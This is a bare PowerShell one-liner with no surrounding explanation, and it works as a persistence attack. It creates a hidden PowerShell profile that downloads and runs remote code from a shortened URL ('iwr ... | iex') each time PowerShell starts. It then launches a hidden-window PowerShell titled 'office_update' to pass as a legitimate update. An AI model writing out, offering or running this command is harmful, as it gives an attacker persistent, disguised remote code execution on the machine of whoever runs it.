powershell -w 1 -NoExit -nop -C { New-Item $PROFILE -force; Get-ChildItem -path $PROFILE -Recurse -Force | foreach {$_.attributes = "Hidden"}; echo "iwr https://goo.gl/i4QKxg | iex" | Out-File $$PROFILE}; cmd /c start powershell -w 1 -NoExit -Command {$Host.UI.RawUI.WindowTitle = "office_update"}
